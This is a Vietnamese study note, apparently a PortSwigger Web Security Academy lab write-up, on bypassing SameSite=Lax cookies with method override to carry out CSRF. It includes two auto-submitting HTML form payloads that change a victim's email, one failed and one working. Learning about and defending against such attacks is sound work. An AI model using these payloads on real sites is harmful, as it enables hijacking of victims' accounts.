![[Pasted image 20260929154909.png]]
- [ ]  Mục tiêu: Thực hiện tấn công CSRF để thay đổi địa chỉ email của nạn nhân (victim).
- [ ]  Kỹ thuật yêu cầu: Bypass SameSite Lax bằng cách ghi đè phương thức (method override).
- [ ]  Công cụ: Sử dụng Exploit Server được cung cấp để host payload.
- [ ]  Tài khoản test: Đăng nhập bằng wiener:peter.
- [ ]  Môi trường test: Sử dụng Chrome hoặc Burp's built-in Chromium browser (vì nạn nhân sử dụng Chrome và cơ chế SameSite mặc định khác nhau giữa các trình duyệt).

-thử thay cái origin bằng 1 website khac=> request vẫn gửi được=> cái change email này xác thực request bằng cookie.
Nhưng liệu xác thực bằng cookie, thì còn có cơ chế nào khác?
- [ ] samesite
- [ ] SOP : same origin pilicy
![[Pasted image 20260929162223.png]]
-> nhìn vào ảnh, ta thấy trường samesite bỏ trống--> nó áp dụng giá trị mặc định của gg là "LAX"


![[Pasted image 20260929161722.png]]

-ta thử gửi với payload này , thì khi view exploit-> ta bị trả về trang đăng nhập.Soi request, thì phát hiện ra, mặc exploit website đã gửi request POST tới change-email, nhưng do có samesite=Lax nên nó ko được gán cookie vào request, do origin nó khác với site của trang web
``` html
<html>
  <body>
    <form action="https://0acf006603edc5fd80406cdc00f90052.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="_method" value="POST">
        <input type="hidden" name="email" value="anh7siuuui@toilet.com">
    </form>
    <script>
        document.forms[0].submit();
    </script>
  </body>
</html>
```

![[Pasted image 20260929161135.png]]





-payload đúng
``` html
<html>
  <body>
    <form action="https://0acf006603edc5fd80406cdc00f90052.web-security-academy.net/my-account/change-email" method="GET">
        <input type="hidden" name="_method" value="POST">
        <input type="hidden" name="email" value="anh7siuuui@toilet.com">
    </form>
    <script>
        document.forms[0].submit();
    </script>
  </body>
</html>
```

![[Pasted image 20260929161216.png]]